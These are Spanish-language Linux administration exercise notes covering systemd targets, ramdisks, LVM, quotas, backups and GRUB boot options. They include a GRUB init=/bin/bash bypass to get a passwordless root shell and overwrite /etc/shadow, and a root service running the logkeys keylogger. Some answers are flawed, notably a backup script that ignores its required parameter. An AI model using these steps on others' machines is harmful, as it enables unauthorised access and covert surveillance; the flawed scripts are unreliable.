Vamos a crear un nuevo target de arranque de nombre fast_dir.target y un servicio asociado de nombre ram_dir.service. En dicho modo de arranque todo funciona igual que en multiuser.target, pero se arranca el servicio que debes crear cuyo único objetivo es la creación de un ramdisk de 128MB, su montado en el directorio /home/user1/fast y la copia a dicho directorio del fichero www.ce.unican.es/SI/LabFiles/Ejercicio5.txt. Evidentemente, nuestro servicio tiene una dependencia con la red, por lo que solo se activará después de que el servicio asociado al networking haya arrancado de forma correcta. Haz que el modo fast-dir sea el que arranque por defecto. 


Para cumplir con estos requisitos en un sistema Linux, necesitas realizar los siguientes pasos:

1. Crear el target de arranque `fast_dir.target`.
2. Crear el servicio `ram_dir.service`.
3. Configurar el sistema para que arranque por defecto en el target `fast_dir.target`.

### Paso 1: Crear el Target de Arranque `fast_dir.target`

Crea un archivo de configuración para el nuevo target de arranque. Vamos a usar `systemd` para esto.

```bash
sudo nano /etc/systemd/system/fast_dir.target
```

Añade el siguiente contenido:

```ini
[Unit]
Description=Fast Directory Target
Requires=multi-user.target
After=multi-user.target

[Install]
Alias=default.target
```

### Paso 2: Crear el Servicio `ram_dir.service`

Crea un archivo de servicio que se encargue de crear el ramdisk, montarlo y copiar el archivo necesario.

```bash
sudo nano /etc/systemd/system/ram_dir.service
```

Añade el siguiente contenido:

```ini
[Unit]
Description=Create and Mount Ramdisk for Fast Directory
Requires=network-online.target
After=network-online.target

[Service]
Type=oneshot
ExecStart=/usr/local/bin/setup_ramdisk.sh

[Install]
WantedBy=fast_dir.target
```

### Paso 3: Crear el Script `setup_ramdisk.sh`

Crea un script que será ejecutado por el servicio `ram_dir.service`.

```bash
sudo nano /usr/local/bin/setup_ramdisk.sh
```

Añade el siguiente contenido:

```bash
#!/bin/bash

# Crear el ramdisk de 128MB
mountpoint="/home/user1/fast"
mkdir -p $mountpoint
mount -t tmpfs -o size=128M tmpfs $mountpoint

# Descargar el archivo y copiarlo al ramdisk
wget -q -O /tmp/Ejercicio5.txt http://www.ce.unican.es/SI/LabFiles/Ejercicio5.txt
cp /tmp/Ejercicio5.txt $mountpoint/
```

Asegúrate de que el script es ejecutable:

```bash
sudo chmod +x /usr/local/bin/setup_ramdisk.sh
```

### Paso 4: Configurar el Target por Defecto

Haz que el sistema arranque por defecto en el nuevo target `fast_dir.target`.

```bash
sudo systemctl set-default fast_dir.target
```

### Paso 5: Habilitar y Probar el Servicio

Habilita el servicio `ram_dir.service` y el target `fast_dir.target`.

```bash
sudo systemctl enable ram_dir.service
sudo systemctl enable fast_dir.target
```

Reinicia el sistema para verificar que todo funciona correctamente.

```bash
sudo reboot
```

### Resumen de Archivos y Comandos

- `/etc/systemd/system/fast_dir.target`
- `/etc/systemd/system/ram_dir.service`
- `/usr/local/bin/setup_ramdisk.sh`

Comandos ejecutados:

```bash
sudo nano /etc/systemd/system/fast_dir.target
sudo nano /etc/systemd/system/ram_dir.service
sudo nano /usr/local/bin/setup_ramdisk.sh
sudo chmod +x /usr/local/bin/setup_ramdisk.sh
sudo systemctl set-default fast_dir.target
sudo systemctl enable ram_dir.service
sudo systemctl enable fast_dir.target
sudo reboot
```
**EXPLICACION DEL TARGET Y SERVICE**

### Archivo `/etc/systemd/system/fast_dir.target`

Este archivo define un nuevo target en `systemd`, llamado `fast_dir.target`.

```ini
[Unit]
Description=Fast Directory Target
Requires=multi-user.target
After=multi-user.target

[Install]
Alias=default.target
```

**Secciones:**
- `[Unit]`: Define información básica sobre la unidad (target en este caso).
  - `Description=Fast Directory Target`: Una descripción del target.
  - `Requires=multi-user.target`: Indica que este target depende del target `multi-user.target`, es decir, `multi-user.target` debe estar activo para que `fast_dir.target` funcione.
  - `After=multi-user.target`: Especifica que `fast_dir.target` debe activarse después de `multi-user.target`.

- `[Install]`: Define la configuración para instalar la unidad.
  - `Alias=default.target`: Define un alias para el target, lo que permite que `fast_dir.target` sea el target por defecto del sistema. Esto significa que el sistema arrancará en `fast_dir.target` en lugar del target por defecto usual (normalmente `graphical.target` o `multi-user.target`).

### Archivo `/etc/systemd/system/ram_dir.service`

Este archivo define un nuevo servicio en `systemd`, llamado `ram_dir.service`.

```ini
[Unit]
Description=Create and Mount Ramdisk for Fast Directory
Requires=network-online.target
After=network-online.target

[Service]
Type=oneshot
ExecStart=/usr/local/bin/setup_ramdisk.sh

[Install]
WantedBy=fast_dir.target
```

**Secciones:**
- `[Unit]`: Define información básica sobre la unidad (servicio en este caso).
  - `Description=Create and Mount Ramdisk for Fast Directory`: Una descripción del servicio.
  - `Requires=network-online.target`: Indica que este servicio depende del target `network-online.target`, asegurándose de que la red esté disponible.
  - `After=network-online.target`: Especifica que `ram_dir.service` debe iniciarse después de que `network-online.target` esté activo.

- `[Service]`: Define la configuración del servicio.
  - `Type=oneshot`: Indica que este servicio se ejecuta una sola vez para realizar una acción y luego se detiene.
  - `ExecStart=/usr/local/bin/setup_ramdisk.sh`: Especifica el comando o script que se ejecutará cuando el servicio se inicie. En este caso, es el script `/usr/local/bin/setup_ramdisk.sh`.

- `[Install]`: Define la configuración para instalar la unidad.
  - `WantedBy=fast_dir.target`: Indica que este servicio debe ser activado cuando `fast_dir.target` se active. Esto significa que `ram_dir.service` se ejecutará automáticamente cuando el sistema arranque en el target `fast_dir.target`.

### Resumen de los Comportamientos

1. **`fast_dir.target`**:
   - Es un nuevo modo de arranque.
   - Depende de `multi-user.target`, por lo que incluye todos los servicios y unidades activadas en `multi-user.target`.
   - Se configuró como el target por defecto.

2. **`ram_dir.service`**:
   - Crea y monta un ramdisk, y copia un archivo a dicho ramdisk.
   - Depende de que la red esté disponible (`network-online.target`).
   - Se ejecuta cuando `fast_dir.target` está activo.

El objetivo es que cuando el sistema arranque en `fast_dir.target`, también se inicie `ram_dir.service`, asegurándose de que la red esté activa antes de intentar descargar y copiar el archivo.


# Otros ejercicios

## Cambiar a una contraseña anterior
Nos proponen recuperar una contraseña previa a la actual. Qué podemos hacer?
Para restituirla deberíamos tener un backup. 
1. Accedemos al sistema como root sin contraseña desde el menu de grub. Nos ponemos sobre la opcón que queremos y presionamos e para reescribir las opciones de arranque: Busca la línea que comienza con linux o linux16 y termina con ro quiet splash o algo similar. Cambia ro a rw y añade init=/bin/bash al final de esta línea. `linux /boot/vmlinuz-xxxx root=/dev/sdX rw init=/bin/bash`
Ahora entramos en el sistema como root sin contraseña. ten en cuenta que el teclado será inglés.

2. Ahora debemos buscar el backup y copiarlo de su ubicación a la original. El archivo que guarda las contraseñas es `/etc/shadow`. Si este backup estuviera en `/root` se vería el comando así: `cp /root/shadow.backup /etc/shadow`.

3. Ahora ya solo quedaría reiniciar con el comando `reboot`, si te da un error este comando usa `/sbin/reboot -f`.

**NOTA**: si no encuentras el backup, como último recurso podrías cambiar la contraseña por la que tu quieras estando en esta terminal especial, simplemente usando `passwd`.

## Gestionar logs de un servicio.
Tenemos esta parte del enunciado de un ejercicio:
"La información obtenida por dicho keylogger se debe almacenar en el fichero /var/log/user-control.log, de cuyo contenido se llevará a cabo una rotación diaria, manteniendo la información de la última semana. El contenido de las rotaciones se debe comprimir para ahorrar espacio en disco."

Cómo lo hacemos?

Lo primero es que el servicio este configurado para guardar los logs en el archivo, se vería algo así:
```bash
[Unit]
Description=Logkeys Keylogger Service
After=network.target

[Service]
# Esta es la línea relevante
ExecStart=/usr/local/bin/logkeys --start --output /var/log/user-control.log
Restart=always
User=root

[Install]
WantedBy=multi-user.target
```

Después hacemos lo "típico" de habilitar e iniciar el servicio.
```bash
sudo systemctl daemon-reload
sudo systemctl enable logkeys.service
sudo systemctl start logkeys.service
```
Y ahora configuramos `logrotate` para rotar y comprimir los logs.
`sudo nano /etc/logrotate.d/user-control`.
Añadimos a este el contenido:
```bash
/var/log/user-control.log {
    daily
    rotate 7
    compress
    missingok
    notifempty
    create 0640 root root
    postrotate
        systemctl restart logkeys.service
    endscript
}
```
Cómo comprobamos que ha funcionado? Podemos forzar una rotación y probar
```bash
#forzar rotacion
sudo logrotate -f /etc/logrotate.d/user-control
#verificar el estado del servicio
sudo systemctl status logkeys.service
```

## Ejercicio sobre crear LVMs

En una máquina en producción se ha decidido utilizar discos distintos al de sistema para alojar el directorio /home. Con los discos disponibles en tu máquina virtual, crea un sistema de ficheros para /home que cumpla los siguientes requisitos:
- El sistema de ficheros debe tener un tamaño de 250Mb, por lo que deberás utilizar los tres discos disponibles para alojarlo.
- El montado del directorio debe ser permanente.
- No se debe perder la información que existe en /home actualmente.
- Debes activar el sistema de cuotas para los usuarios y limitar la cuota del usuario test a 50MB (límite estricto). Comprueba que el límite funciona de manera correcta.

Para cumplir con los requisitos de mover el directorio `/home` a un sistema de archivos nuevo, utilizando tres discos diferentes en una máquina virtual, sigue estos pasos. Vamos a utilizar LVM (Logical Volume Manager) para combinar los tres discos y crear un sistema de archivos que pueda alojar `/home`. También activaremos el sistema de cuotas para los usuarios y configuraremos una cuota para el usuario `test`.

### Paso 1: Preparar los discos

Asume que los tres discos adicionales en la máquina virtual son `/dev/sdb`, `/dev/sdc`, y `/dev/sdd`.

1. **Crear particiones en los discos** (opcional si los discos no tienen particiones):

   ```sh
   sudo fdisk /dev/sdb
   sudo fdisk /dev/sdc
   sudo fdisk /dev/sdd
   ```

   Utiliza `n` para crear una nueva partición primaria en cada disco y `w` para escribir los cambios.

2. **Crear Physical Volumes (PV)**:

   ```sh
   sudo pvcreate /dev/sdb1
   sudo pvcreate /dev/sdc1
   sudo pvcreate /dev/sdd1
   ```

### Paso 2: Crear el Volume Group (VG) y el Logical Volume (LV)

1. **Crear un Volume Group**:

   ```sh
   sudo vgcreate vg_home /dev/sdb1 /dev/sdc1 /dev/sdd1
   ```

2. **Crear un Logical Volume de 250MB**:

   ```sh
   sudo lvcreate -L 250M -n lv_home vg_home
   ```

### Paso 3: Crear el sistema de archivos y montar el nuevo `/home`

1. **Crear el sistema de archivos**:

   ```sh
   sudo mkfs.ext4 /dev/vg_home/lv_home
   ```

2. **Montar temporalmente el nuevo sistema de archivos**:

   ```sh
   sudo mount /dev/vg_home/lv_home /mnt
   ```

3. **Copiar los datos actuales de `/home` a la nueva ubicación**:

   ```sh
   sudo rsync -av /home/ /mnt/
   ```

4. **Actualizar `/etc/fstab` para montar el nuevo `/home` en el arranque**:

   Abre `/etc/fstab` en un editor de texto, por ejemplo:

   ```sh
   sudo nano /etc/fstab
   ```

   Añade la siguiente línea al archivo:

   ```sh
   /dev/vg_home/lv_home /home ext4 defaults 0 2
   ```

5. **Desmontar `/home` temporalmente y montar el nuevo sistema de archivos**:

   ```sh
   sudo umount /mnt
   sudo mount /dev/vg_home/lv_home /home
   ```

### Paso 4: Configurar cuotas de usuario

1. **Instalar el paquete de cuotas (si no está ya instalado)**:

   ```sh
   sudo apt-get install quota -y
   ```

2. **Habilitar las cuotas en `/etc/fstab`**:

   Abre `/etc/fstab` en un editor de texto:

   ```sh
   sudo nano /etc/fstab
   ```

   Modifica la línea que añadiste para `/home` para incluir las opciones de cuotas:

   ```sh
   /dev/vg_home/lv_home /home ext4 defaults,usrquota,grpquota 0 2
   ```

3. **Remontar `/home` para aplicar las nuevas opciones**:

   ```sh
   sudo mount -o remount /home
   ```

4. **Crear los archivos de cuotas**:

   ```sh
   sudo quotacheck -cum /home
   sudo quotaon /home
   ```

5. **Establecer la cuota para el usuario `test`**:

   ```sh
   sudo edquota -u test
   ```

   Se abrirá un editor de texto. Ajusta los límites de la siguiente manera:

   ```plaintext
   Disk quotas for user test (uid 1001):
   Filesystem                   blocks       soft       hard     inodes     soft     hard
   /dev/mapper/vg_home-lv_home        0          0       51200          0        0        0
   ```

   Esto establece un límite estricto de 50MB (51200 bloques de 1KB).

### Paso 5: Verificar la configuración de cuotas

1. **Comprobar las cuotas del usuario `test`**:

   ```sh
   sudo quota -u test
   ```

2. **Probar el límite de cuotas**:

   Intenta escribir datos mayores a 50MB como el usuario `test` para verificar que el límite funciona correctamente.

   ```sh
   sudo su - test
   dd if=/dev/zero of=/home/testfile bs=1M count=60
   ```

   Deberías recibir un error cuando el límite de 50MB sea alcanzado.

Siguiendo estos pasos, habrás movido `/home` a un nuevo sistema de archivos utilizando tres discos, configurado el montado permanente, y establecido cuotas de usuario con un límite estricto para el usuario `test`.

## Ejercicio acerca de la creacion y programacion de backUps
Implementa un script que realice un backup del contenido de /home, con los siguientes requerimientos:
- Utiliza un parámetro de entrada para distinguir el tipo de backup a realizar, entre backup completo (full) o backup incremental (incr) de nivel 1.
- Los ficheros de backup se almacenan en el directorio /backup, y se etiquetan (nombre del fichero) con su fecha de realización y su nivel (full/incr), añadiendo la
extensión “.back”.
Automatiza la ejecución del script para que se ejecute todos los días a las 12:00 pm, donde:
- Los domingos el script hará un backup full, el resto de días será incremental 

### Script de Backup en Shell (`script_backup.sh`)

A continuación, te presento un ejemplo de cómo puedes implementar este script en shell:

```bash
#!/bin/bash

# Directorios
SOURCE_DIR="/home"
BACKUP_DIR="/backup"

# Obtener la día de la semana (0 para domingo, 1 para lunes, ..., 6 para sábado)
DAY_OF_WEEK=$(date +%u)

# Obtener la fecha actual
CURRENT_DATE=$(date +"%Y-%m-%d_%H-%M-%S")

# Determinar el tipo de backup
if [ $DAY_OF_WEEK -eq 7 ]; then
    # Domingo
    BACKUP_TYPE="full"
else
    # Otro día (lunes a sábado)
    BACKUP_TYPE="incr"
fi

# Nombre del archivo de backup
BACKUP_FILENAME="backup_${CURRENT_DATE}_${BACKUP_TYPE}.back"

# Crear el directorio de backup si no existe
mkdir -p $BACKUP_DIR

# Realizar el backup
if [ $BACKUP_TYPE == "full" ]; then
    # Backup completo
    zip -r $BACKUP_DIR/$BACKUP_FILENAME.zip $SOURCE_DIR
elif [ $BACKUP_TYPE == "incr" ]; then
    # Backup incremental de nivel 1
    rsync -a --delete $SOURCE_DIR/ $BACKUP_DIR/$BACKUP_FILENAME/
fi

# Comprimir el backup si no es un backup completo
if [ $BACKUP_TYPE == "incr" ]; then
    zip -r $BACKUP_DIR/$BACKUP_FILENAME.zip $BACKUP_DIR/$BACKUP_FILENAME
    rm -rf $BACKUP_DIR/$BACKUP_FILENAME
fi

echo "Backup $BACKUP_TYPE realizado correctamente: $BACKUP_FILENAME"
```

### Explicación del Script

1. **Variables y Directorios**: Definimos las variables `SOURCE_DIR` (directorio de origen a respaldar) y `BACKUP_DIR` (directorio donde se almacenarán los backups).

2. **Obtención del Día de la Semana**: Usamos `date +%u` para obtener el día de la semana en formato numérico (1 para lunes, 2 para martes, ..., 7 para domingo).

3. **Determinación del Tipo de Backup**: Si `DAY_OF_WEEK` es igual a 7 (domingo), se establece `BACKUP_TYPE` como "full" para backup completo. En caso contrario, se establece como "incr" para backup incremental de nivel 1.

4. **Nombre del Archivo de Backup**: Construimos el nombre del archivo de backup utilizando la fecha actual y el tipo de backup.

5. **Creación del Directorio de Backup**: Usamos `mkdir -p` para crear el directorio de backup si no existe.

6. **Realización del Backup**:
   - Si `BACKUP_TYPE` es "full", usamos `zip -r` para comprimir recursivamente el directorio de origen (`$SOURCE_DIR`) en un archivo ZIP en `$BACKUP_DIR`.
   - Si `BACKUP_TYPE` es "incr", usamos `rsync -a --delete` para sincronizar el contenido de `$SOURCE_DIR` con `$BACKUP_DIR/$BACKUP_FILENAME/` y luego comprimimos este directorio usando `zip -r`. Finalmente, eliminamos el directorio de backup temporal.

7. **Mensaje de Éxito**: Imprimimos un mensaje indicando que el backup se realizó correctamente.

### Automatización con Cron

Para automatizar la ejecución diaria del script a las 12:00 pm usando cron:

1. Abre una terminal.
2. Edita las tareas cron usando el comando:

   ```bash
   crontab -e
   ```

3. Agrega la siguiente línea para ejecutar el script `script_backup.sh` todos los días a las 12:00 pm:

   ```cron
   0 12 * * * /ruta/al/script_backup.sh
   ```

   Asegúrate de reemplazar `/ruta/al/script_backup.sh` con la ruta completa donde guardaste tu script `script_backup.sh`.

4. Guarda y cierra el editor (`cron` guardará automáticamente los cambios).

Con estos pasos, el script de backup se ejecutará automáticamente todos los días a las 12:00 pm, realizando un backup completo los domingos y un backup incremental los demás días de la semana, según los requerimientos especificados. Asegúrate de ajustar las rutas y nombres de archivo según sea necesario para adaptarse a tu entorno y preferencias de almacenamiento.

## Ejercicio acerca de los arranques de una opción por defecto
En este caso se pedía que por defecto se arranque el sistema en modo recovery.

Para configurar tu sistema Linux para que arranque por defecto en modo rescate (single-user mode o modo de rescate), puedes seguir estos pasos generales. Ten en cuenta que los detalles exactos pueden variar ligeramente dependiendo de la distribución específica de Linux que estés utilizando (por ejemplo, Ubuntu, CentOS, Fedora, etc.).

### Método 1: Editar el archivo grub.cfg (para sistemas con GRUB)

1. **Accede al archivo grub.cfg:** Dependiendo de tu distribución Linux, el archivo puede estar ubicado en diferentes lugares. En la mayoría de los casos, está en `/boot/grub/grub.cfg`.

   ```bash
   sudo nano /boot/grub/grub.cfg
   ```

   Si estás utilizando una distribución que utiliza `grub2`, es posible que necesites editar `/etc/default/grub` y luego actualizar el grub.

2. Busca la sección que define las opciones de inicio para las distintas entradas de Linux. Normalmente, encontrarás bloques de configuración con líneas que comienzan con `menuentry`.

3. **Editar la entrada del sistema predeterminado:** Encuentra la entrada correspondiente a tu sistema Linux y añade `single` o `init=/bin/bash` al final de la línea `linux` o `linux16`. Esto puede variar dependiendo de la configuración de tu sistema, pero debería verse algo así:

   ```bash
   linux /vmlinuz-4.15.0-72-generic root=/dev/mapper/ubuntu--vg-root ro single
   ```

   o

   ```bash
   linux /vmlinuz-4.15.0-72-generic root=/dev/mapper/ubuntu--vg-root ro init=/bin/bash
   ```

   Asegúrate de que esta modificación esté dentro de la entrada correspondiente a la configuración que normalmente usarías para arrancar tu sistema.

4. **Guardar y salir:** Guarda los cambios realizados en el archivo `grub.cfg` y cierra el editor.

5. **Reinicia tu sistema:** Reinicia el sistema y debería arrancar directamente en modo rescate.

### Método 2: Usar el parámetro `systemd.unit` (para sistemas con systemd)

Algunas distribuciones modernas utilizan systemd, en lugar de GRUB, para gestionar el arranque. Puedes configurar el modo de rescate utilizando el parámetro `systemd.unit`.

1. **Editar el archivo de configuración de GRUB:** Si tu sistema utiliza GRUB, edita el archivo `/etc/default/grub`.

   ```bash
   sudo nano /etc/default/grub
   ```

2. **Añadir el parámetro `systemd.unit=rescue.target`:** Busca la línea que comienza con `GRUB_CMDLINE_LINUX` y añade `systemd.unit=rescue.target` al final de los valores entre comillas. Debería verse así:

   ```bash
   GRUB_CMDLINE_LINUX="... systemd.unit=rescue.target"
   ```

3. **Actualizar GRUB:** Después de hacer cambios en `/etc/default/grub`, debes actualizar la configuración de GRUB.

   ```bash
   sudo update-grub
   ```

4. **Reiniciar tu sistema:** Una vez hecho esto, reinicia tu sistema y debería arrancar directamente en modo rescate.

### Nota importante:

- Es crucial tener cuidado al editar archivos de configuración del sistema como `grub.cfg` o `/etc/default/grub`. Modificar estos archivos de manera incorrecta puede hacer que tu sistema no arranque correctamente.
- Siempre realiza una copia de seguridad del archivo de configuración antes de editar para poder revertir los cambios si algo sale mal.
- Los comandos y ubicaciones de archivos pueden variar según la distribución de Linux que estés utilizando. Asegúrate de adaptar estos pasos según sea necesario.

### Personalizar grub
[Personalizar grub][https://es.linux-console.net/?p=16580]
